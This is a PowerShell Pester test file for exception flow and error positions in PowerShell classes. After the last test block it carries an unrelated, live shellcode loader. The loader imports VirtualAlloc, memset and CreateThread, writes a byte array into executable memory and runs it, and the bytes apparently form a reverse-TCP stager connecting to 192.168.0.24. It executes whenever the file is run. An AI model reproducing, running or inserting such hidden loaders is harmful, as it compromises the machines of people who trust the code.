

Describe 'Exceptions flow for classes' -Tags "CI" {

    $canaryHashtable = @{}

    $iss = [initialsessionstate]::CreateDefault()
    $iss.Variables.Add([System.Management.Automation.Runspaces.SessionStateVariableEntry]::new('canaryHashtable', $canaryHashtable, $null))
    $iss.Commands.Add([System.Management.Automation.Runspaces.SessionStateFunctionEntry]::new('Get-Canary', '$canaryHashtable'))
    $ps = [powershell]::Create($iss)

    BeforeEach {
        $canaryHashtable.Clear()
        $ps.Commands.Clear()
    }

    Context 'All calls are inside classes' {

        It 'does not execute statements after instance method with exception' {

            
            try {

                $ps.AddScript( @'
class C
{
    [void] m1()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] = 42
        $this.ImThrow()
        $canaryHashtable['canary'] = 100
    }

    [void] ImThrow()
    {
        throw 'I told you'
    }
}
[C]::new().m1()
'@).Invoke()

            } catch {}

            $canaryHashtable['canary'] | Should -Be 42
        }

        It 'does not execute statements after static method with exception' {

            
            try {

                $ps.AddScript( @'
class C
{
    static [void] s1()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] = 43
        [C]::ImThrow()
        $canaryHashtable['canary'] = 100
    }

    static [void] ImThrow()
    {
        1 / 0
    }
}
[C]::s1()
'@).Invoke()

            } catch {}

            $canaryHashtable['canary'] | Should -Be 43
        }

        It 'does not execute statements after instance method with exception and deep stack' {

            
            try {

                $ps.AddScript( @'
class C
{
    [void] m1()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] = 1
        $this.m2()
        $canaryHashtable['canary'] = -6101
    }

    [void] m2()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] += 10
        $this.m3()
        $canaryHashtable['canary'] = -6102
    }

    [void] m3()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] += 100
        $this.m4()
        $canaryHashtable['canary'] = -6103
    }

    [void] m4()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] += 1000
        $this.ImThrow()
        $canaryHashtable['canary'] = -6104
    }

    [void] ImThrow()
    {
        $canaryHashtable = Get-Canary
        $canaryHashtable['canary'] += 10000

        1 / 0
    }
}
[C]::new().m1()
'@).Invoke()

            } catch {}

            $canaryHashtable['canary'] | Should -Be 11111
        }
    }

    Context 'Class method call PS function' {

        $body = @'
class C
{
    [void] m1()
    {
        m2
    }

    static [void] s1()
    {
        s2
    }
}

function m2()
{
    $canary = Get-Canary
    $canary['canaryM'] = 45
    ImThrow
    $canary['canaryM'] = 100
}

function s2()
{
    $canary = Get-Canary
    $canary['canaryS'] = 46
    CallImThrow
    $canary['canaryS'] = 100
}

function CallImThrow()
{
    ImThrow
}

function ImThrow()
{
    1 / 0
}

'@

        It 'does not execute statements after function with exception called from instance method' {

            
            try {

                $ps.AddScript($body).Invoke()
                $ps.AddScript('$c = [C]::new(); $c.m1()').Invoke()

            } catch {}

            $canaryHashtable['canaryM'] | Should -Be 45
        }

        It 'does not execute statements after function with exception called from static method' {

            
            try {

                $ps.AddScript($body).Invoke()
                $ps.AddScript('[C]::s1()').Invoke()

            } catch {}

            $canaryHashtable['canaryS'] | Should -Be 46
        }

    }

    Context "No class is involved" {
        It "functions calls continue execution by default" {

            try {

                $ps.AddScript( @'

$canaryHashtable = Get-Canary
function foo() { 1 / 0; $canaryHashtable['canary'] += 10 }
$canaryHashtable['canary'] = 1
foo
$canaryHashtable['canary'] += 100

'@).Invoke()

            } catch {}

            $canaryHashtable['canary'] | Should -Be 111
        }
    }
}

Describe "Exception error position" -Tags "CI" {
    class MSFT_3090412
    {
        static f1() { [MSFT_3090412]::bar = 42 }
        static f2() { throw "an error in f2" }
        static f3() { "".Substring(0, 10) }
        static f4() { Get-ChildItem nosuchfile -ErrorAction Stop }
    }

    It "Setting a property that doesn't exist" {
        $e = { [MSFT_3090412]::f1() } | Should -Throw -PassThru -ErrorId 'PropertyAssignmentException'
        $e.InvocationInfo.Line | Should -Match ([regex]::Escape('[MSFT_3090412]::bar = 42'))
    }

    It "Throwing an exception" {
        $e = { [MSFT_3090412]::f2() } | Should -Throw -PassThru -ErrorId 'an error in f2'
        $e.InvocationInfo.Line | Should -Match ([regex]::Escape('throw "an error in f2"'))
    }

    It "Calling a .Net method that throws" {
        $e = { [MSFT_3090412]::f3() } | Should -Throw -PassThru -ErrorId 'ArgumentOutOfRangeException'
        $e.InvocationInfo.Line | Should -Match ([regex]::Escape('"".Substring(0, 10)'))
    }

    It "Terminating error" {
        $e = { [MSFT_3090412]::f4() } | Should -Throw -PassThru -ErrorId 'PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand'
        $e.InvocationInfo.Line | Should -Match ([regex]::Escape('Get-ChildItem nosuchfile -ErrorAction Stop'))
    }
}

Describe "Exception from initializer" -Tags "CI" {
    class MSFT_6397334a
    {
        [int]$a = "zz"
        MSFT_6397334a() {}
    }

    class MSFT_6397334b
    {
        [int]$a = "zz"
    }

    class MSFT_6397334c
    {
        static [int]$a = "zz"
        static MSFT_6397334a() {}
    }

    class MSFT_6397334d
    {
        static [int]$a = "zz"
    }

    It "instance member w/ ctor" {
        $e = { [MSFT_6397334a]::new() } | Should -Throw -ErrorId 'InvalidCastFromStringToInteger' -PassThru
        $e.InvocationInfo.Line | Should -Match 'a = "zz"'
    }

    It "instance member w/o ctor" {
        $e = { [MSFT_6397334b]::new() } | Should -Throw -ErrorId 'InvalidCastFromStringToInteger' -PassThru
        $e.InvocationInfo.Line | Should -Match 'a = "zz"'
    }

    It "static member w/ ctor" {
        $e = { $null = [MSFT_6397334c]::a } | Should -Throw -PassThru
        $e.Exception | Should -BeOfType 'System.TypeInitializationException'
        $e.Exception.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'InvalidCastFromStringToInteger'
        $e.Exception.InnerException.InnerException.ErrorRecord.InvocationInfo.Line | Should -Match 'a = "zz"'
    }

    It "static member w/o ctor" {
        $e = { $null = [MSFT_6397334d]::a } | Should -Throw -PassThru
        $e.Exception | Should -BeOfType System.TypeInitializationException
        $e.Exception.InnerException.InnerException.ErrorRecord.FullyQualifiedErrorId | Should -BeExactly 'InvalidCastFromStringToInteger'
        $e.Exception.InnerException.InnerException.ErrorRecord.InvocationInfo.Line | Should -Match 'a = "zz"'
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x18,0x68,0x02,0x00,0x10,0xf8,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

